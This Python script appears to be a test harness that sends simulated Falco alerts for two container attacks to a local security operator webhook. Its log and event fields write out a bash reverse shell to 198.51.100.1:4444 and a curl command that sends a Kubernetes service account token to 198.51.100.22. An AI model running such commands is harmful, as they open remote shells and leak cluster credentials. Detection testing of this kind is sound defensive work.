#!/usr/bin/env python3
"""
CoreOps MITRE ATT&CK Threat Simulator
Simulates real container runtime security exploits to test:
- Falco eBPF runtime detection rules
- Autonomous Security Incident Remediation Controller
- Zero-Trust network quarantine & forensic audit capture
"""

import os
import sys
import time
import json
import logging
import argparse
import requests
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] [CYBER-ATTACK-SIM]: %(message)s")
logger = logging.getLogger("attack-simulator")

OPERATOR_WEBHOOK_URL = os.getenv("OPERATOR_WEBHOOK_URL", "http://localhost:8088/api/v1/security-events")

def simulate_terminal_shell_spawn(target_container: str = "orders-service"):
    """
    Simulates MITRE ATT&CK T1059.004 - Command and Scripting Interpreter: Unix Shell
    A bash/sh process spawned unexpectedly inside a production microservice.
    """
    logger.warning("===================================================================")
    logger.warning(f"🚨 INITIATING ATTACK: MITRE ATT&CK T1059.004 (Spawned Shell in Container)")
    logger.warning(f"   Target: {target_container} | Process: /bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1")
    logger.warning("===================================================================")
    
    event_payload = {
        "event_id": f"evt_{int(time.time()*1000)}",
        "rule": "Terminal shell in container",
        "priority": "Critical",
        "output": f"Notice A shell was spawned in a container with an attached terminal (user=root user_loginuid=-1 container_id=c8f9021a container_name={target_container} image=coreops/orders:latest command=bash -i pgid=12403 cmdline=bash -i)",
        "output_fields": {
            "container.id": "c8f9021a83b2",
            "container.name": target_container,
            "container.image.repository": "coreops/orders",
            "proc.cmdline": "/bin/bash -i",
            "proc.name": "bash",
            "proc.pcmdline": "python main.py",
            "user.name": "root",
            "k8s.pod.name": f"{target_container}-7d8bf84b9-x2k9l",
            "k8s.ns.name": "default"
        },
        "time": datetime.utcnow().isoformat() + "Z"
    }

    try:
        resp = requests.post(OPERATOR_WEBHOOK_URL, json=event_payload, timeout=5)
        logger.info(f"Falco runtime event dispatched to CoreOps Operator. Status: {resp.status_code}")
        logger.info(f"Operator Response: {resp.text}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to transmit Falco alert to Operator at {OPERATOR_WEBHOOK_URL}: {e}")

def simulate_service_account_token_scrape(target_container: str = "payment-service"):
    """
    Simulates MITRE ATT&CK T1552.007 - Unsecured Credentials: Container and Cloud Secrets
    Unauthorized process reading Kubernetes service account token.
    """
    logger.warning("===================================================================")
    logger.warning(f"🚨 INITIATING ATTACK: MITRE ATT&CK T1552.007 (K8s ServiceAccount Token Scrape)")
    logger.warning(f"   Target: {target_container} | Path: /var/run/secrets/kubernetes.io/serviceaccount/token")
    logger.warning("===================================================================")

    event_payload = {
        "event_id": f"evt_{int(time.time()*1000)}",
        "rule": "Read sensitive file untrusted",
        "priority": "Critical",
        "output": f"Critical Sensitive file opened for reading (file=/var/run/secrets/kubernetes.io/serviceaccount/token container_name={target_container} proc=curl)",
        "output_fields": {
            "container.id": "f104d9a2b53e",
            "container.name": target_container,
            "container.image.repository": "coreops/payment",
            "proc.cmdline": "curl -H @/var/run/secrets/kubernetes.io/serviceaccount/token https://198.51.100.22/exfil",
            "proc.name": "curl",
            "user.name": "appuser",
            "k8s.pod.name": f"{target_container}-55b7c7b8d-9q4zt",
            "k8s.ns.name": "default",
            "fd.name": "/var/run/secrets/kubernetes.io/serviceaccount/token"
        },
        "time": datetime.utcnow().isoformat() + "Z"
    }

    try:
        resp = requests.post(OPERATOR_WEBHOOK_URL, json=event_payload, timeout=5)
        logger.info(f"Falco runtime event dispatched to CoreOps Operator. Status: {resp.status_code}")
        logger.info(f"Operator Response: {resp.text}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to transmit Falco alert to Operator at {OPERATOR_WEBHOOK_URL}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CoreOps MITRE ATT&CK Threat Simulator")
    parser.add_argument("--attack", type=str, choices=["shell", "token-scrape"], default="shell", help="Attack pattern to simulate")
    parser.add_argument("--target", type=str, default="orders-service", help="Target container / pod name")
    args = parser.parse_args()

    if args.attack == "shell":
        simulate_terminal_shell_spawn(args.target)
    elif args.attack == "token-scrape":
        simulate_service_account_token_scrape(args.target)
